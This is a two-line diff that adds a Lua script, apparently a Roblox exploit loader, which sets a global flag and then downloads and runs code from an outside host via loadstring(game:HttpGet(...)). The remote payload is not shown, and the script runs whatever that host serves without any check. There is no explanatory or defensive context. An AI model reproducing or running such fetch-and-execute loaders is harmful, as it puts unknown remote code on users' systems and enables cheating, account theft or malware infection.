@@ -1,0 +1,2 @@
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/4cac96c1c736f31f4745b1c7.lua", true))()
